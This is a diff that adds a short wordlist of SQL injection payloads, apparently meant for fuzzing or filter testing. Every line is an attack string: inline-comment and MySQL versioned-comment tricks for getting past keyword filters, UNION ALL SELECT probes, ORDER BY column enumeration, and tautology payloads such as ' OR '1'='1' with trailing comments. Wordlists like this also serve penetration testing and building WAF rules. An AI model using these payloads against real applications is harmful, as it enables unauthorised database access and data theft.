@@ -1,0 +1,21 @@
+/**/SELECT/**/
+/*!SELECT*/
+/*!50000SELECT*/
+/*!UNION*/
+/*!ALL*/
+/**/union/**/all/**/select/**/
+/**/or/**/1=1/**/
+/**/and/**/1=1/**/
+/**/where/**/1=1/**/
+/**/order/**/by/**/1/**/
+SELECT/**/1,2,3/**/FROM/**/users
+SELECT/*comment*/1/*comment*/FROM/*comment*/users
+/*!40000UNION*/ /*!40000ALL*/ /*!40000SELECT*/
+/*!50000or*/1=1
+-- comment
+# comment
+/* comment */
+; -- comment
+) -- comment
+' OR '1'='1' -- comment
+' OR '1'='1' # comment
